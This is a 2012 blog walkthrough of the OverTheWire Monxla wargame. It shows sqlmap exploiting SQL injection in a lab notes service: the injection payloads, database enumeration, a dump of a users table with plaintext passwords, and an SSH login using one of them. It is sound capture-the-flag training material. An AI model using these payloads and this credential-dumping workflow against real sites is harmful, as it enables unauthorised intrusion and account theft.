---
title: "OverTheWire Monxla Part 3"
date: "2012-11-26T05:58:00-05:00"
comments: true
highlight: "true"
categories:
 - overthewire
 - wargames
 - linux
 - monxla
---

Continuing from the last post, we are now logged in as a user. The next step on the PDF from the agent, that we can access, is the Notes Service.

<!-- more -->

I started analyzing the source code, and noticed that the text that says "yes" or "no" in the table is actually an image being rendered from the hasnotes.php file. I started tinkering with that file, and found that it was vulnerable to SQL injection.

{{% figure class="img-responsive" src="/img/monxla3_1.png" %}}

I used [SQLMap](http://sqlmap.org) to automate the [SQL Injection Attack](https://en.wikipedia.org/wiki/SQL_injection) for me. I was pretty much able to just point it at the URL and go:


```
bash-3.2$ ./sqlmap.py -u "http://nasenko.otw/hasnotes.php?username=boris&text=1" --random-agent --cookie="SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1"

    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:35:31

[17:35:31] [INFO] fetched random HTTP User-Agent header from file '/Users/mandreko/Development/sqlmap/txt/user-agents.txt': Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.7) Gecko/20100726 CentOS/3.6-3.el5.centos Firefox/3.6.7
[17:35:31] [INFO] resuming back-end DBMS 'mysql' 
[17:35:31] [INFO] testing connection to the target url
[17:35:31] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=boris' AND 7400=7400 AND 'txSM'='txSM&text=hi

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: username=boris' AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bqmu'='bqmu&text=hi

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: username=boris' AND SLEEP(5) AND 'FtkC'='FtkC&text=hi
---
[17:35:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
web application technology: Apache 2.2.20, PHP 5.3.6
back-end DBMS: MySQL 5.0
[17:35:31] [INFO] fetched data logged to text files under '/Users/mandreko/Development/sqlmap/output/nasenko.otw'

[*] shutting down at 17:35:31
```

This was able to at least confirm my suspicions that a [SQL Injection Attack](https://en.wikipedia.org/wiki/SQL_injection) was possible.  I then attempted to have [SQLMap](http://sqlmap.org) list all the databases in the MySQL Server. 


```
bash-3.2$ ./sqlmap.py -u "http://nasenko.otw/hasnotes.php?username=boris&text=1" --random-agent --cookie="SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1" --dbs

    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:36:14

[17:36:14] [INFO] fetched random HTTP User-Agent header from file '/Users/mandreko/Development/sqlmap/txt/user-agents.txt': Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)
[17:36:14] [INFO] resuming back-end DBMS 'mysql' 
[17:36:14] [INFO] testing connection to the target url
[17:36:14] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=boris' AND 7400=7400 AND 'txSM'='txSM&text=hi

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: username=boris' AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bqmu'='bqmu&text=hi

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: username=boris' AND SLEEP(5) AND 'FtkC'='FtkC&text=hi
---
[17:36:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
web application technology: Apache 2.2.20, PHP 5.3.6
back-end DBMS: MySQL 5.0
[17:36:14] [INFO] fetching database names
[17:36:14] [INFO] the SQL query used returns 2 entries
[17:36:14] [INFO] resumed: information_schema
[17:36:14] [INFO] resumed: notes
available databases [2]:
[*] information_schema
[*] notes

[17:36:14] [INFO] fetched data logged to text files under '/Users/mandreko/Development/sqlmap/output/nasenko.otw'

[*] shutting down at 17:36:14
```

It appears that a "notes" table exists. It may be useful to view the contents: 


```
bash-3.2$ ./sqlmap.py -u "http://nasenko.otw/hasnotes.php?username=boris&text=1" --random-agent --cookie="SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1" -D notes --dump

    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:36:40

[17:36:40] [INFO] fetched random HTTP User-Agent header from file '/Users/mandreko/Development/sqlmap/txt/user-agents.txt': Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
[17:36:40] [INFO] resuming back-end DBMS 'mysql' 
[17:36:40] [INFO] testing connection to the target url
[17:36:40] [INFO] heuristics detected web page charset 'ascii'
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=boris' AND 7400=7400 AND 'txSM'='txSM&text=hi

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: username=boris' AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'bqmu'='bqmu&text=hi

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: username=boris' AND SLEEP(5) AND 'FtkC'='FtkC&text=hi
---
[17:36:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
web application technology: Apache 2.2.20, PHP 5.3.6
back-end DBMS: MySQL 5.0
[17:36:40] [INFO] fetching tables for database: 'notes'
[17:36:40] [INFO] the SQL query used returns 2 entries
[17:36:40] [INFO] resumed: notes
[17:36:40] [INFO] resumed: users
[17:36:40] [INFO] fetching columns for table 'notes' in database 'notes'
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: id
[17:36:40] [INFO] resumed: int(11)
[17:36:40] [INFO] resumed: username
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] resumed: note
[17:36:40] [INFO] resumed: text
[17:36:40] [INFO] fetching entries for table 'notes' in database 'notes'
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: 1
[17:36:40] [INFO] resumed: hello world
[17:36:40] [INFO] resumed: boris
[17:36:40] [INFO] resumed: 2
[17:36:40] [INFO] resumed: Boris, you should really encrypt the passwords in the notes database! Love, your brother Vasili
[17:36:40] [INFO] resumed: boris
[17:36:40] [INFO] resumed: 3
[17:36:40] [INFO] resumed: Vasili, I will look into that soon. For now, I just disabled the logins. Thanks! --Boris
[17:36:40] [INFO] resumed: vasili
[17:36:40] [INFO] analyzing table dump for possible password hashes
Database: notes
Table: notes
[3 entries]
+----+-------------------------------------------------------------------------------------------------+----------+
| id | note                                                                                            | username |
+----+-------------------------------------------------------------------------------------------------+----------+
| 1  | hello world                                                                                     | boris    |
| 2  | Boris, you should really encrypt the passwords in the notes database! Love, your brother Vasili | boris    |
| 3  | Vasili, I will look into that soon. For now, I just disabled the logins. Thanks! --Boris        | vasili   |
+----+-------------------------------------------------------------------------------------------------+----------+

[17:36:40] [INFO] table 'notes.notes' dumped to CSV file '/Users/mandreko/Development/sqlmap/output/nasenko.otw/dump/notes/notes.csv'
[17:36:40] [INFO] fetching columns for table 'users' in database 'notes'
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: username
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] resumed: gecos
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] resumed: password
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] fetching entries for table 'users' in database 'notes'
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: Boris Nasenko
[17:36:40] [INFO] resumed: 347vEnaNufw
[17:36:40] [INFO] resumed: boris
[17:36:40] [INFO] resumed: Nikolai Grigorev
[17:36:40] [INFO] resumed: !plXIlJ42VEr_notyetset
[17:36:40] [INFO] resumed: nikolai
[17:36:40] [INFO] resumed: Vasili Nasenko
[17:36:40] [INFO] resumed: !bPXMZP6puxd_notyetset
[17:36:40] [INFO] resumed: vasili
[17:36:40] [INFO] analyzing table dump for possible password hashes
Database: notes
Table: users
[3 entries]
+------------------+----------+------------------------+
| gecos            | username | password               |
+------------------+----------+------------------------+
| Boris Nasenko    | boris    | 347vEnaNufw            |
| Nikolai Grigorev | nikolai  | !plXIlJ42VEr_notyetset |
| Vasili Nasenko   | vasili   | !bPXMZP6puxd_notyetset |
+------------------+----------+------------------------+

[17:36:40] [INFO] table 'notes.users' dumped to CSV file '/Users/mandreko/Development/sqlmap/output/nasenko.otw/dump/notes/users.csv'
[17:36:40] [INFO] fetched data logged to text files under '/Users/mandreko/Development/sqlmap/output/nasenko.otw'

[*] shutting down at 17:36:40
```

Based on the post on the front page of the Nasenko page, where it states that the SSH passwords are stored in the database, I attempted to use the passwords disclosed to login. 

```
bash-3.2$ ssh boris@nasenko.otw
boris@nasenko.otw's password: 
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-26-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Nov 18 06:29:24 2012 from 192.168.188.1
boris@monxla:~$ 
```

And that's all it takes to get local access to the server.
